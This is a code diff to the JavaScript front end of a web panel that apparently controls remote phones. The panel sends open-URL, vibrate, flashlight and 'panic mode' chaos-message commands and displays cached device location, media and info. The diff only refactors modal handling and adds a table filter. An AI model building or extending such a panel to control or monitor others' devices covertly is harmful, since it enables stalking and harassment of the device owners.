@@ -79,16 +79,19 @@
             document.getElementById('modal').style.display = 'flex';
             document.getElementById('modal-title').innerText = t.toUpperCase();
             
+            const b = document.getElementById('modal-body'), f = document.getElementById('modal-footer');
+            b.innerHTML = ""; f.innerHTML = "";
+
             if(t === 'open_url') {
-                document.getElementById('modal-body').innerHTML = `<p>Target Link:</p><input id="ourl" value="https://google.com">`;
-                document.getElementById('modal-footer').innerHTML = `<button onclick="cmd('openurl '+document.getElementById('ourl').value)">OPEN</button>`;
+                b.innerHTML = `<p>Target Link:</p><input id="ourl" value="https://google.com">`;
+                f.innerHTML = `<button onclick="cmd('openurl '+document.getElementById('ourl').value)">OPEN</button>`;
                 return;
             } else if(t === 'vibrate') {
-                document.getElementById('modal-body').innerHTML = `<p>Duration (Seconds):</p><input type="number" id="vsec" value="5">`;
-                document.getElementById('modal-footer').innerHTML = `<button onclick="cmd('vibrate '+document.getElementById('vsec').value)">START VIBRATE</button>`;
+                b.innerHTML = `<p>Duration (Seconds):</p><input type="number" id="vsec" value="5">`;
+                f.innerHTML = `<button onclick="cmd('vibrate '+document.getElementById('vsec').value)">START VIBRATE</button>`;
                 return;
             } else if(t === 'panic') {
-                document.getElementById('modal-body').innerHTML = `
+                b.innerHTML = `
                     <p style="margin-bottom:5px;">Duration (Seconds):</p>
                     <input type="number" id="psec" value="30" style="margin-bottom:15px;">
                     <p style="margin-bottom:5px;">Chaos Messages:</p>
@@ -98,7 +101,7 @@
                     </div>
                     <button onclick="addPMsg()" style="background:#222; color:var(--primary); margin-top:5px; width:100%">+ ADD MESSAGE</button>
                 `;
-                document.getElementById('modal-footer').innerHTML = `<button class="red-btn" style="width:100%" onclick="startPanic()">🔥 ACTIVATE PANIC MODE</button><button onclick="cmd('stop_panic')">STOP</button>`;
+                f.innerHTML = `<button class="red-btn" style="width:100%" onclick="startPanic()">🔥 ACTIVATE PANIC MODE</button><button onclick="cmd('stop_panic')">STOP</button>`;
                 return;
             }
 
@@ -130,6 +133,9 @@
 
         function render() {
             if(!curMod || !selId || !cache[selId]) return;
+            // Prevent clearing for manual input modes
+            if(['panic', 'vibrate', 'open_url'].includes(curMod)) return;
+
             const d = cache[selId], b = document.getElementById('modal-body'), f = document.getElementById('modal-footer');
             const curHash = JSON.stringify(d[curMod] || d.media || d.location || d.info || "");
             
@@ -209,6 +215,10 @@
                 {id:'open_url', i:'fa-globe', l:'OPEN URL'}
             ];
             document.getElementById('main-grid').innerHTML = btns.map(b=>`<div class="btn" onclick="${b.id==='flash'?'flash=!flash; cmd(flash?\'flashon\':\'flashoff\')':'openModal(\''+b.id+'\')'}"><i class="fas ${b.i}"></i>${b.l}</div>`).join('');
+        }
+        function filterT(e) {
+            let v = e.value.toLowerCase(), rows = e.nextElementSibling.rows;
+            for(let i=1; i<rows.length; i++) rows[i].style.display = rows[i].innerText.toLowerCase().includes(v) ? '' : 'none';
         }
         poll();
     </script>
